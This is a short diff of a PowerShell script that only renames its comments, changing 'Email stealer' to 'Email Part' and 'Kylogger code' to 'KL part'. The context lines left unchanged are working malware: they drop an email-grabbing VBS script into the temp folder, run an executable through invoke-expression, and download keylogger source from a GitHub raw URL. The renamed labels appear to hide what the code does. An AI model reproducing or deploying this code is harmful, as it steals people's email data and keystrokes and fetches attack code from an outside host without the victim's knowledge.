@@ -1,4 +1,4 @@
-#Email stealer 
+#Email Part
 
 $path_vb_ms = [System.IO.Path]::GetTempPath()
 $path_vb_ms=$path_vb_ms+"get_mail.vbs"
@@ -17,7 +17,7 @@ invoke-expression $command
 $command=“cmd /C D:\up.exe”
 invoke-expression $command
 
-#Kylogger code :
+#KL part
 $my_path_k="D:\KLG.cs"
 $url_k='https://raw.githubusercontent.com/FurqanKhan1/Dictator/master/KLG.cs';
 $b.DownloadFile($url_k, $my_path_k) ;
